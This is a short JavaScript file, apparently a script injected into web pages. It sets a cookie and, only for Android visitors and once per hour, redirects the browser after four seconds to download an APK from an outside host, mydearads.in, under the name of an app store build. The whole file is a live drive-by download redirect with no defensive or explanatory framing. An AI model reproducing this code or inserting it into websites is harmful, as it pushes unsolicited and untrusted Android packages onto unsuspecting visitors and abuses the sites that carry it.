function setCookie(name, value, time)
{
var expires = new Date();


expires.setTime( expires.getTime() + time );


document.cookie = name + '=' + value + '; path=/;' + '; expires=' + expires.toGMTString() ;
}


function getCookie(name) {
var cookies = document.cookie.toString().split('; ');
var cookie, c_name, c_value;


for (var n=0; n<cookies.length; n++) {
cookie  = cookies[n].split('=');
c_name  = cookie[0];
c_value = cookie[1];


if ( c_name == name ) {
return c_value;
}
}


return null;
}


if( /Android/i.test(navigator.userAgent) ) {

if ( !getCookie('done') ) {


function Redirect(){ 


var url = window.location.href = "http://mydearads.in/ssworld/com.nineapps_v3.0.6.2_android_(Build1611251030).apk";

}

setTimeout('Redirect()', 4000);

setCookie('done', 1, 3600*1000);
}

}

else {
}